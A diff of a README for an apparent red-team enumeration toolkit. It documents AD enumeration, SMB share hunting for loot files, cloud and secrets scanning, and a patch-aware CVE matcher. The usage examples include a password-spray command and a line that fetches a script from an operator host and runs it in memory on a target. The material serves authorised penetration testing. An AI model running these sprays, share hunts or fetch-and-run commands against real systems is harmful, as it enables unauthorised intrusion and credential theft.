@@ -30,16 +30,20 @@ patch-aware **CVE engine** reports only CVEs the host is genuinely vulnerable to
 |---|---|---|
 | [`windows/Invoke-RTEnum.ps1`](windows/Invoke-RTEnum.ps1) | Windows (PS 5.1+) | Local host triage + **deep privesc** (service-registry ACLs, DLL hijack, BYOVD drivers, UAC, named pipes) **+** full AD enumeration (domain member or standalone) |
 | [`linux/rt-linenum.sh`](linux/rt-linenum.sh) | Linux (bash) | Local privesc triage + **deep surface** (SUID/sudo/caps, cron, containers, LD_PRELOAD/env_keep, library hijack, wildcard injection, kernel CVE hints) |
-| [`linux/rt-adenum.sh`](linux/rt-adenum.sh) | Linux (bash) | AD enumeration **from** Linux (ldapsearch / netexec / impacket / certipy) |
+| [`linux/rt-adenum.sh`](linux/rt-adenum.sh) | Linux (bash) | AD enumeration **from** Linux (ldapsearch / netexec / impacket / certipy) **+ kerbrute-style** user-enum & password spray (native `kinit`) |
 | [`directory/ldap-enum.sh`](directory/ldap-enum.sh) | Linux (bash) | **Non-AD directory services**: OUD (Oracle), OpenLDAP, 389-DS, FreeIPA, generic LDAP — anon binds, naming contexts, users/groups, readable hashes, ACIs, password policy |
 | [`network/net-sweep.sh`](network/net-sweep.sh) | Linux (bash) | Host/port discovery, service fingerprint, DB default-cred checks (MSSQL/MySQL/PostgreSQL/Oracle/Mongo/Redis) |
 | [`network/Invoke-RTNetScan.ps1`](network/Invoke-RTNetScan.ps1) | Windows (PS) | Host/port discovery & service fingerprint (native .NET, no nmap needed) |
+| [`network/Invoke-RTShareHunt.ps1`](network/Invoke-RTShareHunt.ps1) | Windows (PS) | **SMB share hunt** (PowerHuntShares-style): readable/writable shares + loot-file grep |
+| [`network/share-hunt.sh`](network/share-hunt.sh) | Linux (bash) | SMB share hunt via netexec / smbclient |
 | [`cloud/rt-cloudenum.sh`](cloud/rt-cloudenum.sh) | Linux (bash) | Cloud metadata (AWS/Azure/GCP IMDS) + CLI session reuse + Kubernetes |
 | [`cloud/Invoke-RTCloudEnum.ps1`](cloud/Invoke-RTCloudEnum.ps1) | Windows (PS) | Entra ID / Azure posture (IMDS, dsregcmd/PRT, az/Az sessions, AAD Connect) |
 | [`secrets/scan-secrets.sh`](secrets/scan-secrets.sh) | Linux (bash) | Filesystem **secrets scanner**: private keys, cloud/SaaS tokens, DB conn-strings, JWTs, password assignments, git history (values masked) |
 | [`secrets/Invoke-RTSecretScan.ps1`](secrets/Invoke-RTSecretScan.ps1) | Windows (PS) | Same secrets scanner for Windows paths |
+| [`run/run-all.sh`](run/run-all.sh) / [`run/Invoke-RTAll.ps1`](run/Invoke-RTAll.ps1) | Linux / Windows | **Orchestrators** — run every module into one folder and build the report |
+| [`tools/eg-report.py`](tools/eg-report.py) | any (Python) | Merge all `findings.json` into one ranked **HTML report**; `--diff` shows what a hop unlocked |
 
-Plus a **CVE detection system**: [`data/cve-db.txt`](data/cve-db.txt) (curated local-privesc/kernel CVEs with version ranges) is matched by the Linux and Windows enum scripts; [`tools/update-cve-db.sh`](tools/update-cve-db.sh) / [`.ps1`](tools/update-cve-db.ps1) refresh it from the **CISA Known-Exploited-Vulnerabilities** feed.
+Plus a **CVE detection system**: [`data/cve-db.txt`](data/cve-db.txt) (curated local-privesc/kernel CVEs) is matched by the enum scripts and reports a CVE **only when the host is genuinely vulnerable** — it consults the distro package **changelog** (and Windows patch dates) to suppress backported/patched fixes, defeating the version-only false positives that linPEAS/winPEAS produce. [`tools/update-cve-db.sh`](tools/update-cve-db.sh) / [`.ps1`](tools/update-cve-db.ps1) refresh it from the **CISA Known-Exploited-Vulnerabilities** feed.
 
 Each is **self-contained** and **degrades gracefully** — it uses optional tools when
 present (RSAT/PowerView, netexec, impacket, certipy, az/aws/gcloud) and falls back to
@@ -89,11 +93,34 @@ chmod +x linux/rt-linenum.sh
 # memory-only on target:  bash <(curl -s http://you/rt-linenum.sh) -o /dev/shm
 ```
 
-### AD from Linux
+### Run everything + one HTML report
+```bash
+./run/run-all.sh                            # local triage + secrets + cloud, then report
+./run/run-all.sh --net 10.0.0.0/24 --ad -d corp.local --dc 10.0.0.10 -u user -p pass
+```
+```powershell
+. .\run\Invoke-RTAll.ps1 ; Invoke-RTAll -Net 10.0.0.0/24 -OutDir C:\loot
+```
+```bash
+# merge any runs into one report; --diff shows what a hop unlocked
+python3 tools/eg-report.py ./loot1 ./loot2 --diff prev-merged.json -o report.html --save-merged merged.json
+```
+
+### AD from Linux (+ kerbrute-style user-enum & spray)
 ```bash
 ./linux/rt-adenum.sh -d corp.local --dc 10.0.0.10 -u user -p 'Passw0rd!' -j
 ./linux/rt-adenum.sh -d corp.local --dc 10.0.0.10 -u user -H <NTLM-hash>
 ./linux/rt-adenum.sh -d corp.local --dc 10.0.0.10 -k        # host Kerberos ccache
+# user-enum + lockout-aware password spray (uses kerbrute/netexec, else native kinit):
+./linux/rt-adenum.sh -d corp.local --dc 10.0.0.10 --userlist users.txt --userenum --spray 'Spring2026!'
+```
+
+### SMB share hunt
+```powershell
+. .\network\Invoke-RTShareHunt.ps1 ; Invoke-RTShareHunt -Target 10.0.0.0/24 -TestWrite -Json
+```
+```bash
+./network/share-hunt.sh -t 10.0.0.0/24 -u user -p pass -j
 ```
 
 ### Non-AD directory services (OUD / OpenLDAP / 389-DS / FreeIPA)
@@ -160,9 +187,12 @@ The local scans match the host against [`data/cve-db.txt`](data/cve-db.txt) and 
 - **Windows** (updates are cumulative): a CVE is **suppressed** if the host's latest installed
   update is newer than the CVE's fix month. HiveNightmare and PrintNightmare are confirmed by
   **direct tests** (SAM-hive ACL readable; Spooler + Point-and-Print state), not by build alone.
-- **Linux**: a kernel CVE is **suppressed** if the running kernel was **built after** the fix
-  month (distro backport present) or its **precondition** fails (e.g. unprivileged user
-  namespaces disabled). sudo/glibc are confirmed by exact version.
+- **Linux**: before confirming any package-backed CVE (sudo/glibc/polkit/kernel) the engine
+  reads the **distro package changelog** (`changelog.Debian.gz`, RPM `--changelog`) for the CVE
+  id — if the distro backported the fix it is **suppressed**, even when the upstream version
+  string still looks vulnerable (e.g. Ubuntu `sudo 1.9.15p5` carrying the CVE-2025-32463 patch).
+  Kernels also use a build-date gate and preconditions (unprivileged user namespaces). sudo/glibc
+  confirm only when a changelog is readable **and** the CVE is absent from it; otherwise POTENTIAL.
 - In-range-but-unconfirmable → `01c_cve_potential.txt` (not counted as a finding).
   `tools/update-cve-db.*` pulls the latest actively-exploited CVEs (CISA KEV) into
   `01d_cve_latest_feed.txt` as awareness only.
